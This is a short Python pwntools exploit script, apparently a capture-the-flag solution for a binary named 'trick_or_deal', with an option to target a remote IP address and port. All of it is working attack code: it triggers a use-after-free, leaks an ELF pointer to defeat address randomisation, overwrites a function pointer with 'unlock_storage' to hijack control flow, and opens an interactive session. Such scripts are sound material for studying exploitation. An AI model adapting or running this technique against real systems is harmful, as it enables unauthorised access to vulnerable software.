#!/usr/bin/env python3

from pwn import *

the_binary = "./trick_or_deal"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("167.71.138.246", 31103)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def choice(num):
    io.sendlineafter(b"do? ", str(num).encode())

def alloc(data, sz=None):
    if sz is None:
        sz = len(data)
    else:
        assert len(data) <= sz

    choice(3)
    io.sendafter(b"(y/n): ", b"y\x00")
    io.sendafter("to be? ", str(sz).encode())
    io.sendafter("offer me? ", data)

# Trigger free of storage.
choice(4)

# Allocate block over storage up until printStorage function ptr.
alloc(b"A"*0x48, sz=0x50)

# Leak ELF ptr.
choice(1)
io.recvuntil(b"A"*0x48)
raw_leak = io.recvuntil(b"\n", drop=True)[:6]
elf_leak = u64(raw_leak.ljust(8, b"\x00"))
elf.address = elf_leak - elf.sym.printStorage
log.info("ELF leak: %#x" % elf_leak)
log.info("ELF base: %#x" % elf.address)

# Trigger free of storage again
choice(4)

# Allocate block over storage (overwriting function ptr).
alloc(b"A"*0x48 + p64(elf.sym.unlock_storage), sz=0x50)

# Trigger function call.
choice(1)

io.interactive()
